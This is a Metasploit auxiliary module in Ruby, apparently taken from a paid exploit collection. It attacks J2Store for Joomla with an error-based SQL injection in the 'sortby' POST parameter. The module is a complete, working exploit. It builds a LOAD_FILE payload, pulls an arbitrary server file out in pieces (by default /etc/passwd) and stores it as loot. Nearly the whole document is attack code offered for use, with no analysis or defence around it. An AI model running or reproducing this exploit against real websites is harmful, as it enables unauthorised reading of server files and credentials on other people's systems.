##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'J2Store for Joomla! Arbitrary File Read via SQL injection',
      'Description'    => %q{This module reads a file from the server on vulnerable instances.

      This module will attempt to exploit an error-based SQL injection in J2Store version
      3.1.6 and likely earlier in order to read an arbitrary file from the server's file
      system with the privileges of the MySQL user.

      Categories: Joomla, SQL Injection

      Price: 3

      Video: none

      OS: Multi

      Arch: Multi

      Requirements: Metasploit Framework
      },
      'References'     =>
        [
        ],
      'Author'         =>
        [
          'bperry'
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => "Jul 7 2015"
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The relative URI', '/']),
        OptString.new("FILEPATH", [true, 'The file path to read', '/etc/passwd'])
      ], self.class)
  end

  def run
    front_marker = Rex::Text.rand_text_alpha(5)
    back_marker = Rex::Text.rand_text_alpha(5)

    data = nil
    file = ''
    i = 1
    while data != ''
      payload = "(SELECT 6023 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},(MID((IFNULL(CAST(HEX(LOAD_FILE(0x#{datastore['FILEPATH'].unpack("H*")[0]})) AS CHAR),0x20)),#{i},50)),0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
      i+=50
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'index.php'),
        'method' => 'POST',
        'vars_post' => {
          'search' => '',
          'sortby' => payload,
          'option' => 'com_j2store',
          'view' => 'products',
          'task' => 'browse',
          'Itemid' => 115
        }
      })

      res.body =~ /#{front_marker}(.*)#{back_marker}/
      data = $1
      file << data if data
    end

    file = [file].pack("H*")

    path = store_loot("joomla.file", "text/plain", rhost, file, datastore['FILEPATH'])

    print_good("File stored at #{path}")
  end
end

